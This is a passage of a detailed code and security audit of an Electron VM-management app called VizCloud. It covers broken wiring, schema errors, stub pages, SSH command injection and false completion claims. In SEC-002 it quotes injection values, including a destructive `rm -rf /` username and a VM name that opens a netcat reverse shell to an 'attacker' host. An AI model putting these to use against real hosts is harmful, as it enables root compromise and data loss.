# VizCloud — Comprehensive Code & Project Review

**Reviewer:** Independent code-level audit
**Branch / Version:** `1.0.0-alpha.1`
**Review date:** 2026-05-09
**Project rules audited against:** `DEVELOPMENT.md` (13 Immutable Rules + Quality-First Manifesto)
**Scope:** Full source tree (`src/`), build configs, tests, e2e, packaging, documentation

---

## 0. Executive Summary

VizCloud presents itself in `COMPLETION_REPORT.md` and `CURRENT_TASKS.md` as **"100% COMPLETE — Production Ready"**. After a deep code-level audit, this claim is **materially inaccurate** and constitutes a direct violation of `DEVELOPMENT.md` Rule 11 (*"No false claims of completion"*). The project is, charitably, an **architectural skeleton with a polished sidebar**. Functionally it does not work end-to-end — there is no live data flow at all between the renderer and main process.

The most severe issues fall into four families:

1. **The renderer cannot talk to main.** No preload script exists in source, yet `webPreferences.preload` references one. With `contextIsolation: true` + `sandbox: true` and no `contextBridge.exposeInMainWorld(...)`, the renderer has zero exposed API. The five RTK Query slices instead point `fetchBaseQuery({ baseUrl: '/api' })` at an HTTP server that does not exist in this codebase. **The entire data layer is non-functional.**
2. **The database will not initialize.** `src/main/db/schema.ts` defines indexes inline inside `CREATE TABLE` statements (MySQL syntax). SQLite rejects this at parse time. First app launch will throw on `db.exec(schema)`.
3. **Every page is a placeholder.** `DashboardPage`, `HostsPage`, `VMsPage`, `ClustersPage`, `MigrationPage`, `StoragePage`, `TopologyPage`, `DiagnosticsPage`, and `SettingsPage` are static "Coming soon" / hard-coded `0` stubs with no API hooks, no state binding, no event handlers. This violates Rules 3 and 11.
4. **Critical security and integrity defects in the service layer.** Every SSH command is built by string interpolation of user-controlled fields (host IPs, VM names, usernames) — classic remote command injection on every managed host. `StrictHostKeyChecking=no` is hardcoded. SSH always runs as `root@`. The "encrypted via OS keychain" claim is false (a `password_hash` column exists but is never populated). One service file imports types from a hard-coded developer absolute path (`/Users/cnelson/.openclaw/...`).

In addition there are dozens of medium-severity issues: `RootState = any`, two parallel ESLint configs (one with plugins not in `package.json`), no `tailwind.config.*` despite Tailwind classes everywhere, an `index.html` mount-point ID mismatch, `split('\s+')` (string instead of regex) in two parsers, `INSERT OR REPLACE` upserts that silently wipe foreign keys, missing tests for *every* service, and Playwright targeting `http://localhost:3000` instead of an actual Electron instance.

The good news: the **scaffolding is sound**. Module layout, atomic-design folder structure, RTK Query usage pattern, type model, and electron-builder targets are all reasonable. With a focused 4-phase remediation plan (~3–5 weeks of senior-engineer work) this project can move from "polished demo shell" to actual alpha. The plan is in §10.

**Overall Grade by Domain**

| Domain                       | Grade | Notes                                                  |
| ---------------------------- | :---: | ------------------------------------------------------ |
| Project rules adherence      |  D-   | Rules 3, 4, 8, 11, 13 each violated in multiple places |
| Electron security posture    |   D   | Secure flags set, but no preload + raw SSH = unsafe    |
| Data layer (DB)              |   F   | Schema fails to compile in SQLite                      |
| Service layer                |   D   | Functional shape OK, but injection-prone & buggy       |
| Renderer (UI shell)          |   B   | Layout/sidebar/error boundary are decent               |
| Renderer (functionality)     |   F   | Pages are stubs; APIs target nonexistent server        |
| Type model (`shared/types`)  |  B+   | Comprehensive and well-shaped                          |
| Tests                        |  D-   | 19 trivial tests, 10 skipped, no service coverage      |
| E2E                          |   D   | Tests browser via Vite, not actual Electron            |
| Build / packaging            |   C   | configs exist; main `tsconfig` waives strictness       |
| Documentation accuracy       |   F   | Major false-completion claims                          |

---

## 1. How To Read This Review

Each finding has the following metadata:

* **ID** — stable identifier (`SEC-001`, `BUG-014`, etc.) so it can be tracked in the backlog artifact.
* **Severity** — `P0` (broken at runtime), `P1` (security/data-integrity), `P2` (functional bug or anti-pattern), `P3` (refactor / hygiene).
* **Rule(s) violated** — which of the 13 immutable rules in `DEVELOPMENT.md` this contradicts.
* **Location** — `path:line` references against the current tree.
* **Effort** — rough fix size: `XS` (<30 min), `S` (½–2 hr), `M` (½–1 day), `L` (multi-day), `XL` (multi-week).

---

## 2. Critical (P0) — Project Will Not Function

### SEC-001 / ARCH-001 — No preload script exists; renderer has no API surface
**Severity:** P0  **Effort:** M  **Rules:** 1, 3, 11, 13

Files reference `preload/preload.js`:
* `src/main/main.ts:138` — `preload: join(__dirname, '../preload/preload.js')`
* `src/main/core/window.manager.ts:154-159` — `getPreloadPath()` resolves `../../preload/preload.ts` and `../preload/preload.js`

There is **no source file** anywhere under `src/main/preload/` or `src/preload/`. `Glob` returns nothing in either path. With `nodeIntegration: false`, `contextIsolation: true`, and `sandbox: true`, the renderer has:
* no `window.electron` (the test setup mocks one — but production has none),
* no `contextBridge.exposeInMainWorld(...)` calls anywhere in the codebase,
* no IPC bridge of any kind.

**Implication:** The renderer cannot invoke a single one of the 28 IPC handlers in `ipc.handlers.ts`, nor any of the host/VM/cluster/migration/metrics services.

**Fix:** Create `src/main/preload/preload.ts`, register it as a separate Vite/electron build entry, and expose a typed API surface (see ARCH-002 below). Wire the renderer through `window.vizcloud.<api>` instead of `fetchBaseQuery('/api')`.

---

### ARCH-002 — RTK Query APIs target a non-existent HTTP server
**Severity:** P0  **Effort:** L  **Rules:** 3, 11, 13

All five RTK Query slices use `fetchBaseQuery({ baseUrl: '/api' })`:

* `src/renderer/store/api/hostsApi.ts:6`
* `src/renderer/store/api/vmsApi.ts:6`
* `src/renderer/store/api/clustersApi.ts:6`
* `src/renderer/store/api/metricsApi.ts:25`
* `src/renderer/store/api/migrationsApi.ts:6`

This is an Electron app. There is no Express/Fastify/Koa server. Requests to `/api/hosts` resolve against `file://` (in production) or the Vite dev server (in dev) and will 404 in both. **Every query and mutation in the app fails at runtime.**

**Fix:** Replace `fetchBaseQuery` with a custom `BaseQueryFn` that calls `window.vizcloud.invoke(channel, args)` via the preload bridge. RTK Query supports this pattern cleanly — example in §11.

Also: `metricsApi` and `migrationsApi` are **defined but never registered** in the Redux store (`src/renderer/store/index.ts:11-19` only registers `hostsApi`, `vmsApi`, `clustersApi`). Their hooks would crash with "could not find store" errors if anyone tried to call them.

---

### DB-001 — SQLite schema uses MySQL-style inline `INDEX` clauses; database fails to initialize
**Severity:** P0  **Effort:** S  **Rules:** 3, 11, 13

Throughout `src/main/db/schema.ts` (lines 71-74, 108, 166-169, 190, 210, 245, 263, 280-281, 292, 338-340, 385-386, 402-404, 419-420, 441) every table embeds `INDEX idx_xxx (col)` clauses inside the `CREATE TABLE` body:

```sql
CREATE TABLE IF NOT EXISTS hosts (
    ...
    INDEX idx_hosts_hostname (hostname),
    INDEX idx_hosts_cluster_id (cluster_id),
    ...
);
```

**SQLite does not support inline index declarations.** They must be separate statements: `CREATE INDEX IF NOT EXISTS idx_hosts_hostname ON hosts(hostname);`. On the first call to `db.exec(schema)` (`database.service.ts:66`), better-sqlite3 throws `SqliteError: near "INDEX": syntax error`. **The app cannot start.**

**Fix:** Strip the inline `INDEX` clauses, append `CREATE INDEX IF NOT EXISTS ...` statements after each `CREATE TABLE`. This will also fix forward-reference brittleness between `hosts` and `clusters` (currently the schema relies on parse-order luck).

---

### BUG-001 — Hardcoded developer absolute path in two source files
**Severity:** P0  **Effort:** XS  **Rules:** 4, 5, 9, 11

* `src/main/services/migration.service.ts:9`
  `import { Migration, MigrationState, VM } from '/Users/cnelson/.openclaw/workspace/VizCloud/src/shared/types/index';`
* `src/renderer/store/api/migrationsApi.ts:2`
  `import type { Migration } from '/Users/cnelson/.openclaw/workspace/VizCloud/src/shared/types/index';`

This breaks every developer's machine and CI immediately — and even on the original author's machine if `/Users/cnelson/.openclaw/...` no longer exists. Both files must use the `@shared/types` alias that already works for the other 30+ importers.

**Fix:** Replace with `import { Migration, MigrationState, VM } from '@shared/types'`. Add an ESLint rule (`no-restricted-imports` with absolute-path pattern) so this can never recur.

---

### BUG-002 — Renderer mount point ID mismatch
**Severity:** P0  **Effort:** XS  **Rules:** 11, 13

* `index.html:10` — `<div id="app"></div>`
* `src/renderer/index.tsx:12` — `document.getElementById('root')!`

`getElementById('root')` returns `null`, the non-null `!` lies, and `createRoot(null!)` throws `Target container is not a DOM element`. The app never renders.

**Fix:** Pick one ID (`root` is conventional) and update both files. Add an e2e smoke test that asserts `aside` *and* main content render, not just the sidebar (current e2e tests only check the sidebar, which is the part that *would* still render if the bootstrap mounted).

---

### BUG-003 — Tailwind has no `tailwind.config.*` or `postcss.config.*`
**Severity:** P0  **Effort:** S  **Rules:** 4, 11, 13

`Glob /Users/.../VizCloud/{tailwind.config.*,postcss.config.*}` returns no matches. Yet:
* `package.json` declares `tailwindcss: ^3.4.0` and `autoprefixer`/`postcss` devDeps.
* The entire UI uses custom Tailwind tokens: `bg-page`, `bg-sidebar`, `text-foreground`, `bg-success`, `bg-destructive`, `border-border`, etc. — none of which exist in stock Tailwind.
* `src/renderer/styles/theme.ts` defines the design tokens but is a TypeScript object Tailwind never reads.

Without `tailwind.config.js` registering the theme tokens *and* a `postcss.config.js` invoking the Tailwind plugin, **no Tailwind utilities are emitted**. The app will render as unstyled HTML.

**Fix:** Add both configs. Bridge `theme.ts` into `tailwind.config.js` via `theme.extend.colors = { ...themeTs.colors }`. Verify that `globals.css` includes `@tailwind base; @tailwind components; @tailwind utilities;`.

---

### BUG-004 — `eslint.config.js` references plugins not in `package.json`
**Severity:** P0  **Effort:** S  **Rules:** 4, 11, 13

`eslint.config.js` imports:
* `@eslint/js`, `typescript-eslint`, `eslint-plugin-react`, `eslint-plugin-react-hooks`, `eslint-plugin-testing-library`, `eslint-plugin-import`, `eslint-plugin-jest`, `eslint-plugin-playwright`, `eslint-config-prettier`.

`package.json` declares only: `eslint`, `@typescript-eslint/eslint-plugin`, `@typescript-eslint/parser`, `eslint-plugin-react`, `eslint-plugin-react-hooks`. **Running `npm run lint` will fail with `ERR_MODULE_NOT_FOUND`.**

Additionally, both `.eslintrc.json` (legacy) **and** `eslint.config.js` (flat) exist. ESLint 8.57+ prefers flat; the legacy one is dead. Two configs is a Rule 4 violation.

**Fix:** Pick one config (recommend flat). Install missing plugins. Delete the other.

---

### BUG-005 — Missing `tsconfig.main.json` referenced from `package.json` exists but is misconfigured
**Severity:** P0  **Effort:** XS  **Rules:** 11, 13

`tsconfig.main.json` *does* exist (verified via `Glob`), but its contents (`strictNullChecks: false`, `noUnusedLocals: false`, `noUnusedParameters: false`) override the strict-mode settings inherited from `tsconfig.json`. Rule 13 says zero TypeScript errors with strict mode. The main process is silently exempted from this contract — and since `npm run typecheck` uses **`tsconfig.app.json`** (which excludes `src/main/**`), the main process is **never type-checked at all**.

In addition, `tsconfig.main.json` sets `module: "CommonJS"` but `package.json` has `"type": "module"`. Outputting CJS files with a `.js` extension into a `"type": "module"` package causes Node to interpret them as ESM and fail with `SyntaxError: Cannot use import statement outside a module` — or vice versa for `require()` calls.

**Fix:**
1. Remove the `strictNullChecks: false` override.
2. Update `npm run typecheck` to run *both* configs (`tsc -p tsconfig.app.json --noEmit && tsc -p tsconfig.main.json --noEmit`).
3. Output the main bundle to `.cjs` files, or set `"type": "commonjs"` for the main subpackage, or use `electron-vite` which solves this cleanly.

---

### BUG-006 — `StatusBadge` status dot uses string literal, not template literal
**Severity:** P0 (visual regression)  **Effort:** XS  **Rules:** 13

`src/renderer/components/atoms/StatusBadge.tsx:36`
```tsx
<span className="w-2 h-2 rounded-full ${config.dot} animate-pulse" />
```
Note the **double quotes** rather than backticks. The class becomes the literal six-character string `${config.dot}` which Tailwind purges, leaving an unstyled empty dot. Status colors never apply. (Even if styled, the surrounding string was already a template-literal context elsewhere — this is just a typo missed by the test suite.)

**Fix:** Replace with backticks: `` className={`w-2 h-2 rounded-full ${config.dot} animate-pulse`} ``.

---

## 3. High Severity (P1) — Security & Data Integrity

### SEC-002 — Remote command injection on every managed host
**Severity:** P1  **Effort:** L  **Rules:** 2, 11, 13

Every SSH call concatenates user-controlled values straight into a shell command:

* `src/main/services/host.service.ts:175-177`
  ```ts
  const sshCommand = commands.map(cmd =>
    `ssh ... ${connection.username}@${connection.host} "${cmd}" 2>/dev/null || echo "error"`
  ).join(' && ');
  ```
  Both `connection.username` and `connection.host` flow from the renderer. A username of `me;rm -rf /;#` executes locally before SSH ever runs.

* `src/main/services/vm.service.ts:66-68, 207, 397`
  ```ts
  const sshCmd = `ssh ... root@${host.ipAddress} "virsh list --all --name"`;
  ...
  const cmd = `ssh ... root@${host.ipAddress} "virsh ${operation} ${vm.name}"`;
  ```
  `vm.name` is user-input. A VM named `mybox; nc attacker 4444 -e /bin/bash` runs that pipeline as root on every targeted hypervisor.

* `src/main/services/cluster.service.ts:45`, `migration.service.ts:95-98, 144`, `metrics.service.ts:88` — same pattern.

Combined with `StrictHostKeyChecking=no` (every file), this is **remote root code execution to every connected host, with MITM also viable**.

**Fix (in order):**
1. Use `child_process.spawn` with an argv array — never `exec(shellString)`. The first arg should be `ssh`, with the rest as discrete tokens. This eliminates shell metacharacter interpretation entirely.
2. Replace one-shot SSH-per-command with a persistent connection: `ssh2` (npm) gives a programmatic SSH client with channel multiplexing — far faster (one TCP handshake instead of N) and safer (no shell at all between Node and the remote command).
3. Replace `StrictHostKeyChecking=no` with a managed `known_hosts` file. On first connect, fetch the fingerprint, store it, and surface a UI prompt for the user to verify (TOFU model, like OpenSSH). Optionally support pinning in settings.
4. Stop hardcoding `root@`. Use the connection's `username` field (and once the keychain integration is real, the keypair).
5. For libvirt specifically: prefer `node-libvirt` or the libvirt remote driver (`qemu+ssh://`) with native auth, instead of shelling out to `virsh` over SSH.

---

### SEC-003 — Plaintext-credentials posture; "OS keychain" claim is false
**Severity:** P1  **Effort:** M  **Rules:** 9, 11, 13

`README.md:159` claims:
> Encrypted Storage: SSH passwords encrypted using OS keychain

Reality:
* `host_connections.password_hash` in `schema.ts:434` is the **only** credential field defined and is never populated.
* No `keytar` / `safeStorage` / `node-keytar` / Electron `safeStorage` API is imported anywhere (verified via Grep).
* `HostService.connectedHosts: Map<string, HostConnection>` (`host.service.ts:16`) holds connection objects in main-process memory; if a password were ever supplied, it sits in plaintext for the process lifetime.

**Fix:**
1. Use Electron's built-in `safeStorage.encryptString(...)` (uses Keychain on macOS, DPAPI on Windows, libsecret on Linux). Persist the ciphertext in `host_connections.password_blob` (`BLOB`), drop `password_hash` (a hash is unrecoverable — useless for *using* the password to log in).
2. Strongly prefer **key-based** or **agent-based** auth in the UI; gate password auth behind a feature flag. Allow PIV/YubiKey-PIV via the agent.
3. Never log connection objects (`host.service.ts:34, 64, 87` log host IDs which is fine; double-check no future call logs the whole `HostConnection`).

---

### SEC-004 — `app.enableSandbox()` only on non-darwin
**Severity:** P1  **Effort:** XS  **Rules:** 11, 13

`src/main/main.ts:228-230`
```ts
if (process.platform !== 'darwin') {
    app.enableSandbox();
}
```
Sandbox should be enabled on all platforms. The per-window `webPreferences.sandbox: true` covers the main window, but `app.enableSandbox()` also constrains any child windows or future renderers (PDF viewer, log viewer, etc.) you add later.

**Fix:** Remove the platform guard. Enable sandbox unconditionally.

---

### SEC-005 — `will-navigate` allows plain HTTP and `file://` to anywhere
**Severity:** P1  **Effort:** XS  **Rules:** 11, 13

`src/main/main.ts:185-190`
```ts
mainWindow.webContents.on('will-navigate', (event, url) => {
    if (url.startsWith('https://') || url.startsWith('http://localhost') || url.startsWith('file://')) {
        return;
    }
    event.preventDefault();
});
```
The README claims "HTTPS only enforced". The code allows any `file://` (so a malicious link to `file:///etc/passwd` opens), and any HTTP on localhost (any local malware can hijack). It also doesn't intercept `webContents.on('will-frame-navigate', ...)` for iframes.

**Fix:** Only allow navigation to the app's own packaged `index.html` (compare resolved path) or the Vite dev URL when present. Use `setWindowOpenHandler` for everything else. Add a `permission-request-handler` that denies all media/notifications/etc. unless explicitly opted-in. Add a static CSP via the `Content-Security-Policy` header on the `default` session — the README claims one but no code sets it.

---

### SEC-006 — No CSP set despite README claim
**Severity:** P1  **Effort:** S  **Rules:** 9, 11, 13

`README.md:163` claims "CSP enforced". Grep across `src/` for `Content-Security-Policy`, `responseHeaders`, `webRequest`, `onHeadersReceived`: **zero matches**. There is no CSP, no meta tag in `index.html`, and no header-injection logic.

**Fix:** In the main process, on app `ready`:
```ts
session.defaultSession.webRequest.onHeadersReceived((details, cb) => {
  cb({ responseHeaders: { ...details.responseHeaders,
    'Content-Security-Policy': [
      "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; font-src 'self' data:; object-src 'none'; base-uri 'self'; frame-ancestors 'none';"
    ]
  }});
});
```
Drop `'unsafe-inline'` for styles once Tailwind's emitted CSS is the only stylesheet (no inline styles). Prefer nonce-based script CSP if you ever inline scripts.

---

### SEC-007 — Electron Fuses not configured in packaging
**Severity:** P1  **Effort:** S  **Rules:** 11, 13

`package.json` `build` block does not declare any `electronFuses`. Electron Fuses (`@electron/fuses`) let you bake-in:
* `RunAsNode = false` (prevents `--inspect`/V8 debugging in production)
* `EnableNodeOptionsEnvironmentVariable = false`
* `EnableNodeCliInspectArguments = false`
* `EnableEmbeddedAsarIntegrityValidation = true`
* `OnlyLoadAppFromAsar = true`
* `LoadBrowserProcessSpecificV8Snapshot = false`
* `GrantFileProtocolExtraPrivileges = false`

Without these, an attacker who can write to the app bundle (or trick the user into running with env vars) can inject Node code into your signed binary.

**Fix:** Add an `afterPack` electron-builder hook calling `@electron/fuses` with the recommended hardened set; verify with `npx @electron/fuses read --app <path>`.

---

### SEC-008 — App not signed/notarized; no auto-updater pinning
**Severity:** P1  **Effort:** M  **Rules:** 9, 11, 13

`package.json` `build` block has no `mac.notarize`, no `mac.identity`, no `win.certificateFile`, no `linux.publish`, no `electron-updater` integration. README claims "Distribution Artifacts: .dmg/.zip/.exe/.AppImage/.deb" but installing those today on macOS triggers Gatekeeper rejection and on Windows will SmartScreen-warn forever.

**Fix:**
1. macOS: configure `mac.notarize: { teamId: 'XXXXX' }`, `mac.identity` Developer-ID cert, `mac.hardenedRuntime: true`, entitlements file.
2. Windows: EV certificate via `win.certificateFile` or Azure Trusted Signing.
3. Add `electron-updater` with a signed update channel (GitHub Releases or S3 + signature verification). Pin update server cert via custom net request handler.

---

### SEC-009 — `process.env` exposed to renderer minus a denylist
**Severity:** P1  **Effort:** XS  **Rules:** 11, 13

`src/main/core/ipc.handlers.ts:121-128`
```ts
ipcMain.handle('native:process-env', () => ({
  platform: process.platform, arch: process.arch, version: process.version,
  env: Object.keys(process.env).filter(k => !k.includes('PASSWORD') && !k.includes('TOKEN')),
}));
```
A *denylist* approach for env names is fragile — misses `SECRET`, `KEY`, `CREDENTIALS`, `AWS_*`, `SESSION`, `COOKIE`, `PRIVATE`, etc. and any custom names. Worse: this returns *all* env keys — even just the names leak operational info (CI vars, tooling, paths).

**Fix:** Don't expose `process.env` at all. If the renderer needs platform/arch/version, expose those discrete fields through the preload API.

---

### DATA-001 — `INSERT OR REPLACE` upserts silently nuke unrelated columns
**Severity:** P1  **Effort:** M  **Rules:** 11, 13

`src/main/services/host.service.ts:254-297` does:
```ts
INSERT OR REPLACE INTO hosts (id, hostname, ..., tags, notes, created_at, updated_at)
VALUES (?, ?, ..., '[]', '', ?, ?)
```
Every hostname/IP poll re-inserts the row from scratch, wiping `cluster_id`, `rack`, `tags`, `notes`, `cluster_role`, `pcs_connected`, `corosync_connected`, `description`, etc. Same pattern in `vm.service.ts:120` (notes/tags) and `cluster.service.ts:65` (network/tags).

`INSERT OR REPLACE` on a table with FK references also **deletes** the row first (causing `ON DELETE CASCADE` on `cluster_hosts`, `vms`, etc. to fire), so every poll cycle could orphan or delete rows.

**Fix:** Use real `UPSERT` syntax: `INSERT ... ON CONFLICT(id) DO UPDATE SET col=excluded.col, ...` for only the fields you actually want to refresh. Wrap multi-statement discovery in `db.transaction()`.

---

### DATA-002 — No real migration system; `SCHEMA_VERSION` exported but never consulted
**Severity:** P1  **Effort:** M  **Rules:** 9, 11, 13

`src/main/db/schema.ts:6` defines `export const SCHEMA_VERSION = 1` but `database.service.ts:62-66` reads `pragma user_version` and ignores the result, then unconditionally re-execs the entire schema. There's no path to evolve the schema without manual SQL surgery.

**Fix:** Adopt a directional migration list:
```ts
const migrations: Migration[] = [
  { version: 1, up: '...sql...' },
  { version: 2, up: 'ALTER TABLE hosts ADD COLUMN ...' },
];
```
Loop while `db.pragma('user_version')[0].user_version < latestVersion`, run `up`, bump `pragma user_version = N`. Wrap each in a transaction. Consider `umzug` or `node-pg-migrate`-style tooling, or a slim hand-rolled runner.

---

### DATA-003 — DB column casing vs. type-model casing mismatch
**Severity:** P1  **Effort:** M  **Rules:** 11, 13

Schema uses `snake_case`: `ip_address`, `cluster_id`, `cpu_cores`, `memory_total`, `last_heartbeat`, `cluster_role`, etc. Types in `src/shared/types/index.ts` use `camelCase`: `ipAddress`, `clusterId`, `cpuCores`, etc. Services do this without any mapper:

* `host.service.ts:108` — `return stmt.all() as Host[];`
* `vm.service.ts:38` — `return stmt.all() as VM[];`

The cast is **a lie**: at runtime each row has snake_case keys, the renderer expects camelCase keys, and every `host.ipAddress` access at the renderer is `undefined`. The whole UI sees blank fields.

**Fix:**
1. Centralize a `rowToHost(row)` / `rowToVM(row)` mapper, or
2. Use better-sqlite3's `pluck`/`raw` plus a generic `camelCase` mapper, or
3. Switch to a thin query-builder (Kysely, Drizzle) that handles `column_name` ↔ `columnName` automatically.

Consider writing a generated TS interface from the schema (Kysely generator) so the snake/camel boundary lives in exactly one place.

---

### BUG-007 — `vm.service.ts` parses with literal `'\s+'` instead of regex
**Severity:** P1  **Effort:** XS  **Rules:** 11, 13

* `src/main/services/vm.service.ts:293` — `const parts = line.trim().split('\s+');`
* `src/main/services/vm.service.ts:318` — same pattern

`split('\s+')` splits on the literal six-character string `\s+`, never on whitespace. So `parts.length >= 2` is almost always false, and *no* disks or interfaces are ever discovered. The "VM Operations: Full lifecycle management" feature claim is built on this code.

**Fix:** `split(/\s+/)`.

Even after fixing: the `parseDomblklist` function fabricates the `source` path: `/var/lib/libvirt/images/${vmName}/${parts[1]}.qcow2`. The actual source is column 2 of `virsh domblklist`. This needs a real parser (and ideally `virsh dumpxml --inactive <vm>` parsing for accurate disk metadata, formats, capacities, etc.).

---

### BUG-008 — `HostService.upsertHost` parameter alignment off-by-one
**Severity:** P1  **Effort:** S  **Rules:** 11, 13

`host.service.ts:254-297` — the `INSERT OR REPLACE` SQL has 29 placeholders. The `insertStmt.run(...)` call passes:

```
hostId, info.hostname, info.ipAddress, info.macAddress,                         // 4
info.cpuModel, info.cpuCores, info.cpuThreads, info.memoryTotal, info.memoryAvailable, // 9
info.storageTotal, info.storageUsed, info.status, info.lastHeartbeat, info.uptime,     // 14
info.loadAverage[0], info.loadAverage[1], info.loadAverage[2],                  // 17
info.libvirtVersion, info.qemuVersion, info.vmCount, info.vmRunningCount,       // 21
existing?.created_at || Date.now(), Date.now()                                   // 23
```

That's only 23 arguments for 29 columns marked `?` (counting carefully). The SQL VALUES list embeds literals (`'', NULL, 0, 0, '[]', ''`) for some, but a recount against the column list shows mis-alignment between `cluster_role`/`pcs_connected`/`corosync_connected` placeholders and the run() args. better-sqlite3 will silently bind by position and produce wrong rows.

**Fix:** Stop building `INSERT` SQL with positional `?` over 29 columns. Use a proper builder, or switch to UPSERT-by-id with named bindings (`prepare('INSERT INTO hosts(...) VALUES(@id,...)')` and pass an object).

---

### BUG-009 — `MetricsService.executeMetricsCollection` parser is empty
**Severity:** P1  **Effort:** M  **Rules:** 3, 11, 13

`src/main/services/metrics.service.ts:131-139`
```ts
for (const line of lines) {
  if (line.includes('Cpu')) {
    const match = line.match(/(\d+\.?\d*)/);
    if (match) metrics.cpuUsage = parseFloat(match[1]);
  }
  if (line.startsWith('Mem:') || line.startsWith('Swap:')) {
    // Parse memory info  ← TODO body, never written
  }
}
```
A literal placeholder. Direct violation of Rule 3 (*"NEVER add TODO comments without completing the work"*) and Rule 11.

**Fix:** Replace the entire shell-based scrape with structured tools:
* CPU: `cat /proc/stat`, compute deltas across two samples (don't use `top`).
* Memory: `cat /proc/meminfo` (much more reliable than parsing `free -b`).
* Disk IO: `cat /proc/diskstats` (delta-based).
* Network: `cat /proc/net/dev` (delta-based).
* Load: `cat /proc/loadavg`.
Send ONE SSH session that emits a JSON envelope (`echo "{\"cpu\":...}"` constructed server-side) so the client parses JSON instead of mixed shell output. Even better — drop a tiny Go/Rust collector binary on each host that exposes a JSON metrics endpoint over a pinned mTLS connection.

---

### BUG-010 — `MigrationService` has no progress tracking despite README/RTK claim
**Severity:** P1  **Effort:** L  **Rules:** 3, 11, 13

`migration.service.ts:101-104` just `await execAsync(migrateCmd, { timeout: 3600000 })`. There is no incremental progress polling, no parsing of `virsh migrate --verbose` output, no event emission. The DB row goes `pending` → `transferring` (immediately) → `completed`, regardless of actual state. The renderer's `migrationsApi` defines `progress` and `dataProcessed` fields that are never updated.

**Fix:** Run `virsh migrate --verbose` via a `spawn` (not `exec`) and pipe stdout. Each line of output yields a fresh progress %; emit a `migration:progress` IPC event. Also implement bounded concurrency (one in-flight migration per VM, configurable cluster-wide cap), pre-flight checks (target host capacity, shared storage check, CPU model compatibility), and rollback semantics if `host_id` update fails after a successful migration.

---

### BUG-011 — `LoggerService(source)` constructor parameter is ignored
**Severity:** P1  **Effort:** XS  **Rules:** 11, 13

`src/main/core/logger.service.ts:23-25`
```ts
constructor(source: string) {
  this.logger = log;        // singleton — `source` never stored
  this.configure();         // reconfigures the global log every constructor
}
```
* `source` is captured by signature but never used: every log entry is anonymous.
* Each call to `new LoggerService('Foo')` re-runs `configure()` — every service mutating the same global. Idempotent but wasteful, and the `source` parameter is misleading documentation.

**Fix:** Store `this.source` and prepend it to every emitted message; format `[{source}] {text}`. Run `configure()` exactly once (lazy singleton) instead of per-instance.

Also: `src/main/core/logger.service.ts:10` does `(globalThis as any).app = app;` which leaks Electron's `app` to every module via globals. Remove.

---

### BUG-012 — `RootState = any`
**Severity:** P1  **Effort:** XS  **Rules:** 13

`src/renderer/store/index.ts:28` — `export type RootState = any;`

Direct violation of Rule 13's `no-explicit-any`. Every `useAppSelector(state => state.X)` call is now untyped, defeating the entire reason to use Redux Toolkit.

**Fix:** `export type RootState = ReturnType<typeof store.getState>;` and update `useAppSelector` to `TypedUseSelectorHook<RootState>`.

---

### TEST-001 — `database.service.test.ts` is `describe.skip` and contains placeholder assertions
**Severity:** P1  **Effort:** M  **Rules:** 3, 11, 13

`tests/unit/services/database.service.test.ts:4` — `describe.skip(...)`. Inside, line 19: `expect(true).toBe(true); // Placeholder`. Two literal violations of Rule 3.

The test count from `COMPLETION_REPORT.md` ("19 tests passed | 10 skipped") shows the project considers a *skipped* test as part of "100% complete". It is not.

**Fix:** Use `better-sqlite3` against `:memory:` for unit tests so no native-module env is needed. Cover: WAL pragma assertion, foreign keys ON, transaction rollback, integrity check ok, vacuum no-throw, prepared statement reuse, queryAll/queryGet types.

---

### TEST-002 — Playwright tests don't actually run Electron
**Severity:** P1  **Effort:** M  **Rules:** 11, 13

`playwright.config.ts:22-27` spins up `npm run dev` (Vite at `:3000`) and tests `http://localhost:3000` in Chromium. That's testing the React renderer in a browser tab. It never:
* loads the Electron main process,
* exercises the preload bridge,
* covers the IPC layer,
* validates window state, autoUpdater, menus, deep linking.

**Fix:** Use `_electron.launch({ args: ['.'] })` from `@playwright/test` with `await electronApp.firstWindow()`. Wire e2e against the *built* `dist/main/main.js` so packaging regressions surface. Keep one fast "renderer-only" job for component-level browser tests, but call the Electron job something different (e.g., `test:electron`).

---

### TEST-003 — No service-layer tests at all
**Severity:** P1  **Effort:** L  **Rules:** 13

Zero tests for: `host.service`, `vm.service`, `cluster.service`, `migration.service`, `metrics.service`, `ipc.handlers`, `window.manager`. `npm run test:coverage` will report ~0% on the main process.

**Fix:** For each service, mock `child_process.exec` (or better, the `ssh2` client once introduced) and assert: command shape, parsing of canonical fixtures, DB rows produced, error-path branches, idempotency under repeated calls.

---

### DOC-001 — `COMPLETION_REPORT.md` and `CURRENT_TASKS.md` claim 100% completion despite project being non-functional
**Severity:** P1  **Effort:** XS  **Rules:** 1, 9, 11

Direct quote from `CURRENT_TASKS.md`:
> Project Status: ✅ 100% COMPLETE - Production Ready
> ✅ 9 backend services (TypeScript)
> ✅ 5 API layers (RTK Query)
> ✅ Database schema (9 tables)
> ✅ IPC communication (40+ channels)

Reality (per this audit): Database doesn't initialize. Renderer can't reach IPC. APIs hit a non-existent server. Pages are stubs. `tsconfig.main.json` waives strict null checks. Two ESLint configs with missing plugins. Migration service imports from a hardcoded developer path.

This document directly violates Rule 11 (*"There should be NO false claims of completion ... no 'blowing smoke', keep 100% honest at all times"*).

**Fix:** Rewrite both docs to reflect reality. Replace progress bars with a live-updated checklist (which is also Rule 8). Mark the project as **`pre-alpha — architectural skeleton`**. Re-baseline phases: `Phase 0 = scaffolding (done)`, `Phase 1 = wiring (in progress)`, `Phase 2 = first end-to-end vertical (host discovery)`, etc.

---

## 4. Medium Severity (P2) — Functional Bugs & Anti-Patterns

### BUG-013 — Two `LoadingSpinner` and two `ErrorBoundary` components
**Severity:** P2  **Effort:** XS  **Rules:** 4, 5

* `src/renderer/components/atoms/LoadingSpinner.tsx`
* `src/renderer/components/common/LoadingSpinner.tsx`
* (Likewise `ErrorBoundary.tsx` — `common/` version exists.)

`App.tsx:5-6` imports the `common/` versions, so the `atoms/` ones are dead code. The atoms `index.ts` re-exports the atoms version but also re-exports `DataCard` from `molecules/` — broken Atomic Design hierarchy.

**Fix:** Delete `common/`. Keep atoms-level versions. Remove the cross-tier re-export.

### BUG-014 — `useAppSelector` is untyped
**Severity:** P2  **Effort:** XS  **Rules:** 13

`src/renderer/store/hooks.ts:5` — `export const useAppSelector = useSelector;`

Should be:
```ts
export const useAppSelector: TypedUseSelectorHook<RootState> = useSelector;
```

### BUG-015 — Non-null assertions on functions that legitimately return null
